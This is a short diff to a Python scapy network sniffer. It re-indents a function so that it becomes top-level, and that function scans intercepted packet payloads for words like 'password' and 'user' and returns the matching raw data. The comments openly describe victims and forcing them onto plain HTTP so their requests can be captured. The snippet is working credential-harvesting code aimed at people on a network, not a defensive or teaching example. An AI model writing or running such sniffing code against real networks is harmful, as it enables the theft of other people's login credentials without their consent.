@@ -26,14 +26,15 @@ def StartSniffData(NetowrkInterface):
 
 def GetDataFromHTTP(packet): # Get Data From HTTP Requests And Responses If You Want To Capture HTTPS Reqqests And Responses You Have To Force The Victim To Use HTTP Protocol!
 	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-	def GetLoginDataFromSites(packet):
-		if packet.haslayer(scapy.Raw):
-			DataLoaded = packet[scapy.Raw].load
-			KeyWords = ["username","login","password","user","pass"] # You Can Add More KeyWords Here!
-			for LoginKeyWord in KeyWords:
-				if LoginKeyWord in DataLoaded:
-					return DataLoaded
-					break # LOL IDK Why I But Break If There is An Return Function But I Will Leave That Here LOL
+	
+def GetLoginDataFromSites(packet):
+	if packet.haslayer(scapy.Raw):
+		DataLoaded = packet[scapy.Raw].load
+		KeyWords = ["username","login","password","user","pass"] # You Can Add More KeyWords Here!
+		for LoginKeyWord in KeyWords:
+			if LoginKeyWord in DataLoaded:
+				return DataLoaded
+				break # LOL IDK Why I But Break If There is An Return Function But I Will Leave That Here LOL
 
 def SniffNetworkTrafic(packet):
 	if packet.haslayer(http.HTTPRequest):# Check IF This Request Is HTTP Request IF true Complete This Statment!
